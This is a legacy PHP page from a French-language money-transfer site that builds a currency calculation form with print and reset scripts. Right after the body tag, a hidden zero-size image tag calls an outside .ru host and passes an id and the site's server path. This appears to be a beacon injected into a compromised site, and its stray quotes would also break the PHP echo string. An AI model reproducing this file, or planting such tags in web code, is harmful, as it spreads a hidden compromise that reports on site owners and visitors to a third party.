<?php
/* Programme : TRanSactionCALculFeNeTre.php
* Description : Affichage de la page de calcul pour un transfert
* Auteur : Denis Léveillé 	 		  Date : 2007-03-28
 */
	if( $_SESSION['devise'] == 'CUC' ){
		$image = 'images/cuba.gif';
	}
	elseif( $_SESSION['devise'] == 'USD' ){
		$image = 'images/usa.gif';
	}
	elseif( $_SESSION['devise'] == 'EUR' ){
		$image = 'images/europe.gif';
	}
	else{
		$image = 'images/canada.gif';
	}
	$imageUSD = 'images/usa.gif';
	
	if( $CurTrans == 'CUC' ){
		$imageTRS = 'images/cuba.gif';
	}
	elseif( $CurTrans == 'USD' ){
		$imageTRS = 'images/usa.gif';
	}
	elseif( $CurTrans == 'EUR' ){
		$imageTRS = 'images/europe.gif';
	}
	else{
		$imageTRS = 'images/canada.gif';
	}
	
//	$_AVECENTETE = 1;
	$_AVECITEM = 1;
	$_AVECTOTAL = 1;
//	$_AVECCLIENT = 1;
	$EN_PANIER = 1;
	$_Retour = 'certificat_calcul';


echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
<style type='text/css'>
  @page { size:landscape; }
</style>
		<base target='MAIN'>
	</head>
	<script language='javascript1.2' src='extra/javafich/denislib.js'></script>
	<script language='javascript1.2' src='extra/javafich/disablekeys.js'></script>
	<script language='javascript1.2' src='extra/javafich/blokclick.js'></script>
	<script language='JavaScript1.2'>addKeyEvent();</script>
<body  onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >";

?>
<form name='Calcul' action='certificat_calcul.php?btpanier=1' method='post'> 
<table bgcolor='#EFEFEF' width="<?=$Large?>"  align='<?=$Enligne?>' border="0" cellspacing="0" cellpadding="0">
   <tr>
      <td class='titreWhiteCenter' bgcolor="#96B2CB">
			<table width='100%' cellpadding='4' cellspacing='0' height='22' border='0' background='images/bg_main_haut.jpg'>
				<tr>
					<td  align=left nowrap>
						&nbsp;
					</td>
					<td align=right nowrap>
						<b><?=$txt['afficher_prix_en_devise']?></b>
					    <select class='s1' name='devise' onchange='document.forms["Calcul"].submit()'>
<?php
				 		  for($i=0;$i<sizeof($TabPaie);$i++) {
				    	    	echo "<option value='".$TabPaie[$i]."' ";
				    			if( $_SESSION['devise'] == $TabPaie[$i] ) echo " SELECTED";
				    			echo " >\n".$TabPaie[$i];
				  		  } // for $i
?>
					    </select>
				    </td>
			    </tr>
		    </table>  
      </td>
   </tr>
		<tr>
			<td> 
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='1' bordercolor='#9EA2AB'>
<?php		include('commande.inc'); ?>
			</table>
			</td>
		</tr>	
    <tr>
      <td colspan="1" align="center">
		 		<br><br>
				<input type="hidden" name="id" value="<?=$id?>"/>
				<input type='button' id='B2' style='visibility:visible' name='reinit' value='<?=$TabMessTrs[63]?>' onClick='ResetTransaction()' class="ajout_submit">&nbsp;&nbsp;
		 		<input type='button' id='B3' style='visibility:visible' name='Imprime' value='<?=$TabMessGen[24]?>' onClick='ImprimePage()' class="ajout_submit">&nbsp;
		 		<input type='submit' id='B4' style='visibility:visible' name="btpanier" value="<?=$txt['ajouter_votre_panier']?>" class="ajout_submit" >
				<!-- input type='button' id='B4' style='visibility:visible' name='Commande' value='Test' onClick='onbeforeprint()' class='ajout_submit' -->
		 		<br/><br/>
      </td>
   </tr>
  	<tr> 
    	<td>
			<?php include("bas_page.inc"); ?>
		</td>
  	</tr>
</table>
</form>

<script LANGUAGE="javascript">

function ouvre_plein_ecran(fichier) {
	ff=window.open(fichier,"pop","'','toolbar=no,status=no,resizable=yes,scrollbar=yes,width=400, height=400, left=330, top=330'");
 	ff.focus();
}  


function ImprimePage() {
	window.print();
} // ImprimePage

function window.onbeforeprint()
{
	cache('B1');
	cache('B2');
	cache('B3');
	cache('B4');
}

function  window.onafterprint()
{
	montre('B1');
	montre('B2');
	montre('B3');
	montre('B4');
}      

function ResetTransaction(){

	  document.Calcul.Service.value = 5;
	  document.Calcul.ModePaye.value = 5;
	  document.Calcul.Transfert.value  = 0;
//	  document.Calcul.Transfert.value  = document.Calcul.Transfert.options.value;

	  document.Calcul.Poids.value  = "";
	  document.Calcul.Douane.value  = "";
	  document.Calcul.Assurance.value  = "";
	  document.Calcul.TransUS.value  = "";
	  document.Calcul.FrTransant.value  = "";
	  document.Calcul.FrFixe.value  = "";
	  document.Calcul.CoutUS.value  = "";
	  document.Calcul.CurTrans.value = "CUC";
	  document.Calcul.Plus.value = "";
	  document.Calcul.Pourcent.value = "";
	  document.Calcul.Total.value  = "";
	  document.Calcul.DevDisp.value =  "<?php echo $_SESSION['devise'];?>";
//	  document.Calcul.DevPaye.value =   document.Calcul.DevDisp.value;
	  document.Calcul.TauxChg.value = 1;
	  document.Calcul.Disponible.value = 9999999;
	  document.Calcul.submit();
	

} // ResetTransaction


function pageonload() {
	<?php
          if( isset($NewMessage) ) {
	    	echo "	alert(\"$NewMessage\"); ";
          	unset( $NewMessage );
          }
        ?>
}

function Rafraichie(){
			window.location.reload();
//	open( "certificat_calcul.php", "_self" );
//	document.forms["Menu"].submit();
}

</script>

</body>
</html>